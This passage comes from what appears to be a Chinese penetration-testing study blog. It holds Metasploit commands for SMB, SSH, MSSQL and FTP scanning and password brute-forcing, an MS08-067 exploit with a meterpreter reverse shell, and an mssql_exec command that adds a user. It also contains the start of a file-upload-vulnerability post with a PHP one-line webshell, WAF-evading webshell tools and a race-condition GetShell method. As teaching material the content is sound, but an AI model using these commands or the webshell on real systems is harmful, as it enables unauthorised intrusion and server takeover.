管道可以访问的 RCERPC 服务<ul><li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li></ul></li><li>SMB 共享账号（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_enumshares</li></ul></li><li>SMB 用户枚举（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_enumusers</li></ul></li><li>SID 枚举（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_lookupsid</li></ul></li><li>SMB 版本扫描</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search smb</span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; show options </span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; <span class="keyword">set</span> SMBUSER <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_version) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_version) &gt; run</span></span><br></pre></td></tr></table></figure><ul><li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_auditor) &gt; run</span></span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 继续上述</span></span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="builtin-name">set</span> SMBUser Administrator</span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="builtin-name">set</span> SMBPass 123456</span><br></pre></td></tr></table></figure><ul><li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; run</span></span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; run</span></span><br></pre></td></tr></table></figure><ul><li>SMB 共享账号（账号、密码）</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; run</span></span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; run</span></span><br></pre></td></tr></table></figure><ul><li>SMB 用户枚举（账号、密码）</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; run</span></span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; run</span></span><br></pre></td></tr></table></figure><ul><li>SID 枚举（账号、密码）</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_lookupsid</span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options </span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; <span class="keyword">set</span> RHOSTS <span class="number">10.10</span><span class="number">.10</span><span class="number">.148</span></span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_lookupsid) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_lookupsid) &gt; run</span></span><br></pre></td></tr></table></figure><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul><li>SSH 版本扫描<ul><li>use auxiliary/scanner/ssh/ssh_version</li></ul></li><li>SSH 密码爆破<ul><li>use auxiliary/scanner/ssh/ssh_login<ul><li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li></ul></li></ul></li><li>SSH 公钥登陆<ul><li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul><li>set KEY_FILE id_rsa；set USERNAME root ；run</li></ul></li></ul></li><li>SSH 版本扫描</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_version) &gt; run</span></span><br></pre></td></tr></table></figure><ul><li>SSH 密码爆破</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt </span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; set USERPASS_FILE</span> /usr/<span class="comment">share</span>/metasploit-framework/<span class="comment">data</span>/wordlists/<span class="comment">root_userpass.txt</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; set VERBOSE false</span> </span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; run</span></span><br></pre></td></tr></table></figure><ul><li>SSH 公钥登陆</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login_pubkey) &gt; set USERNAME root</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</span></span><br></pre></td></tr></table></figure><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul><li><p>基于已经取得的 session 进行检测</p></li><li><p>use post/windows/gather/enum_patches</p><ul><li>show advanced</li><li>set VERBOSE yes</li></ul></li><li><p>检查失败</p><ul><li>known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次进行尝试</li></ul></li><li><p>ms08-067</p></li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; <span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; set payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; run</span></span><br></pre></td></tr></table></figure><p><img src="oXOv9u8.png" alt="img"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; backgroun</span><br><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; sessions</span><br></pre></td></tr></table></figure><p><img src="5eADIeS.png" alt="img"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; set SESSION <span class="number">4</span></span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; run</span><br></pre></td></tr></table></figure><p><img src="VEpQ5Ut.png" alt="img"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程错误，迁移进程</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; sessions -i 4</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; migrate 828  # spoolsv.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; background </span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; run</span></span><br></pre></td></tr></table></figure><p><img src="DCfpDji.png" alt="img"></p><h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul><li><p>mssql 扫描端口</p><ul><li>TCP 1422（动态端口）/ UDP 1434 （查询 TCP 端口号）</li><li>use auxiliary/scanner/mssql/mssql_ping</li></ul></li><li><p>爆破 mssql 密码</p></li><li><p>use auxiliary/scanner/mssql/mssql_login</p></li><li><p>远程执行代码（获取数据库权限之后）</p></li><li><p>use auxiliary/admin/mssql/mssql_exec</p><ul><li>set CMD net user user1 pass123 /ADD</li></ul></li><li><p>mssql扫描端口</p></li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">msf auxiliary(scanner/mssql/mssql_ping) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.142</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/mssql/<span class="comment">mssql_ping) &gt; run</span></span><br></pre></td></tr></table></figure><h4 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h4><ul><li><p>ftp 版本扫描</p><ul><li>use auxiliary/scanner/ftp/ftp_version</li><li>use auxiliary/scanner/ftp/anonymous</li><li>use auxiliary/scanner/ftp/ftp_login</li></ul></li><li><p>use auxiliary/scanner/ [tab]</p></li><li><p>Display all 479 possibilities? (y or n)</p></li><li><p>查询版本信息</p></li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">msf (scanner/ftp/ftp_version) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">ftp_version) &gt; run</span></span><br></pre></td></tr></table></figure><p><img src="HZ8JVfi.png" alt="img"></p><ul><li><p>是否允许匿名登录</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">msf auxiliary(scanner/ftp/anonymous) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">anonymous) &gt; run</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="A6Ms8B3.png" alt="img"></p><ul><li><p>暴力破解</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/<span class="keyword">ftp</span>/ftp_login</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试——Mestasploit-基本使用&quot;&gt;&lt;a href=&quot;#渗透测试——Mestasploit-基本使用&quot; class=&quot;headerlink&quot; title=&quot;渗透测试——Mestasploit 基本使用&quot;&gt;&lt;/a&gt;渗透测试——Mestasploit 基本
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞学习</title>
    <link href="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/"/>
    <id>https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/</id>
    <published>2020-04-03T08:49:18.000Z</published>
    <updated>2020-04-29T10:49:53.003Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞学习笔记-靶场实战"><a href="#文件上传漏洞学习笔记-靶场实战" class="headerlink" title="文件上传漏洞学习笔记+靶场实战"></a>文件上传漏洞学习笔记+靶场实战</h1><h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p><p><strong>关于PHP中$_FILES数组的使用方法</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘name’</span>] 客户端文件名称</span><br><span class="line"></span><br><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘type’</span>] 文件的MIME类型</span><br><span class="line"></span><br><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘size’</span>] 文件大小 单位字节</span><br><span class="line"></span><br><span class="line">$<span class="emphasis">_FILES\[‘file’][‘tmp_</span>name’] 文件被上传后在服务器端临时文件名，可以在php.ini中指定</span><br></pre></td></tr></table></figure><p>需要注意的是在文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用copy或者<code>move_uploaded_file</code>两个函数</p><h5 id="文件上传中常见的函数错误"><a href="#文件上传中常见的函数错误" class="headerlink" title="文件上传中常见的函数错误"></a>文件上传中常见的函数错误</h5><p><strong>这些函数有:<code>empty()、isset()、strpos()、rename()</code>等，如下面的代码:</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$operateId</span> == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$date</span> = date(<span class="string">"Ymd"</span>);</span><br><span class="line">    <span class="variable">$dest</span> = <span class="variable">$CONFIG</span>-&gt;basePath.<span class="string">"data/files/"</span>.<span class="variable">$date</span>.<span class="string">"/"</span>;</span><br><span class="line">    <span class="variable">$COMMON</span>-&gt;createDir(<span class="variable">$dest</span>);</span><br><span class="line">    <span class="regexp">//i</span>f (!is_dir(<span class="variable">$dest</span>))   mkdir(<span class="variable">$dest</span>, <span class="number">0777</span>);</span><br><span class="line">    <span class="variable">$nameExt</span> = strtolower(<span class="variable">$COMMON</span>-&gt;getFileExtName(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'name'</span>]));</span><br><span class="line">    <span class="variable">$allowedType</span> = array(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'bmp'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$nameExt</span>, <span class="variable">$allowedType</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(empty(<span class="variable">$msg</span>))&#123;</span><br><span class="line">        <span class="variable">$filename</span> = getmicrotime().<span class="string">'.'</span>.<span class="variable">$nameExt</span>;</span><br><span class="line">        <span class="variable">$file_url</span> = urlencode(<span class="variable">$CONFIG</span>-&gt;baseUrl.<span class="string">'data/files/'</span>.<span class="variable">$date</span>.<span class="string">"/"</span>.<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$dest</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span>(empty(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'error'</span>]))&#123;</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'tmp_name'</span>],<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="regexp">//</span><span class="variable">$msg</span> = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="variable">$file_url</span>;</span><br><span class="line">            @chmod(<span class="variable">$filename</span>, <span class="number">0444</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$outMsg</span> = <span class="string">"fileUrl="</span>.<span class="variable">$msg</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">"eoutmsg"</span>] = <span class="variable">$outMsg</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="文件上传漏洞的利用"><a href="#文件上传漏洞的利用" class="headerlink" title="文件上传漏洞的利用"></a>文件上传漏洞的利用</h4><p>​        这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p><ul><li>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；</li><li>上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器；</li><li>上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击；</li><li>上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行；</li><li>上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞(Local File Include)执行该文件。如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数包含执行。</li></ul><h5 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h5><p>Webshell:大马、小马</p><ul><li>大马：代码量多，功能多</li><li>小马：代码量少，功能也少</li></ul><p>例如：一句话木马<?php eval($_POST[‘a’]); ?>    单引号可不加，只能接受php代码</p><p><strong>菜刀种类</strong></p><ul><li>中国菜刀：基本都有后门，强烈不推荐使用</li><li>cknife（C刀）：一般</li><li>蚁剑：js开发，中国菜刀js版，推荐使用，github有</li><li>冰蝎：自带加密，木马没有特征，极力推荐使用，github有</li><li>k8飞刀：推荐使用，工具多</li></ul><p>什么时候用大马？什么时候用小马？什么时候用过狗马？</p><ul><li>过狗小马：冰蝎小马</li><li>过狗大马：过狗大马</li><li>遇到安全狗，直接上大马，不考虑小马，原因：菜刀流量特征明显，而大马是正常文件正常访问。小马才需要菜刀连接，大马不需要。</li></ul><h4 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h4><p>条件竞争漏洞,</p><p>接着看下面这段代码(摘自某VPN系统)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'realfile'</span>])&#123;</span><br><span class="line">    copy($_POST[<span class="string">'realfile'</span>],$_POST[<span class="string">'path'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$file = mb_convert_encoding($_POST[file],<span class="string">"GBK"</span>,<span class="string">"UTF-8"</span>);</span><br><span class="line">header(<span class="string">"Pragma:"</span>);</span><br><span class="line">header(<span class="string">"Cache-Control:"</span>);</span><br><span class="line">header(<span class="string">"Content-type:application/octet-stream"</span>);</span><br><span class="line">header(<span class="string">"Content-Length:"</span>.filesize($_POST[path]));</span><br><span class="line">header(<span class="string">"Content-Disposition:attachment;filename=\"$file\""</span>);</span><br><span class="line">readfile($_POST[path]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'realfile'</span>])&#123;</span><br><span class="line">    unlink($_POST[<span class="string">"path"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码的逻辑表面上看起来是这样的(对于攻击者来说)：</p><p>利用copy函数，将realfile生成shell.php-→删除掉shell.php</p><p>这样初看起来没办法利用，但是仔细一想, 这段代码其实是存在逻辑问题的，所以我们可以利用这个逻辑缺陷达到GetShell的目的。</p><p>具体利用方法：</p><p>copy成temp.php–&gt;不断访问temp.php-&gt;temp.php生成shell.php-&gt;删除temp.php</p><h4 id="校验方式分类-amp-总结"><a href="#校验方式分类-amp-总结" class="headerlink" title="校验方式分类&amp;总结"></a>校验方式分类&amp;总结</h4><ul><li>客户端javascript校验（一般只校验后缀名）</li><li>服务端校验</li><li>文件头content-type字段校验（image/gif）</li><li>文件内容头校验（GIF89a）</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li><li>WAF设备校验（根据不同的WAF产品而定）</li></ul><h4 id="校验方式溯源"><a href="#校验方式溯源" class="headerlink" title="校验方式溯源"></a>校验方式溯源</h4><p>​    通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：</p><p><img src="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s" alt="img"></p><h4 id="校验方式-amp-绕过姿势"><a href="#校验方式-amp-绕过姿势" class="headerlink" title="校验方式&amp;绕过姿势"></a>校验方式&amp;绕过姿势</h4><h5 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h5><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。当WebDAV开启PUT，MOVE，COPY，DELETE方法时，攻击者就可以向服务器上传危险脚本文件。</p><p>此时可以使用OPTIONS探测服务器支持的http方法，如果支持PUT，就进行上传脚本文件，在通过MOVE或COPY方法改名。当开启DELETE时还可以删除文件。</p><p>参考:<a href="http://wiki.wooyun.org/server:httpput" target="_blank" rel="noopener">http://wiki.wooyun.org/server:httpput</a></p><h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><h5 id="JavaScript校验"><a href="#JavaScript校验" class="headerlink" title="JavaScript校验"></a>JavaScript校验</h5><p>验证代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 